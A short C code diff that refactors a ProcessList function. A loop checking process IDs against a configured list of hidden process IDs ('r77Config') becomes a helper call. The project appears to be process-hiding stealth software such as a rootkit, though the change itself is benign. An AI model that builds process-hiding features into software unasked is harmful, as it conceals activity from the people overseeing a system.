@@ -120,14 +120,7 @@ int ProcessList()
 			}
 		}
 
-		for (DWORD i = 0; i < r77Config->HiddenProcessIdCount; i++)
-		{
-			if (r77Config->HiddenProcessIds[i] == processEntry.th32ProcessID)
-			{
-				isHiddenById = 1;
-				break;
-			}
-		}
+		isHiddenById = IntegerListContains(r77Config->HiddenProcessIds, processEntry.th32ProcessID);
 
 		wprintf
 		(
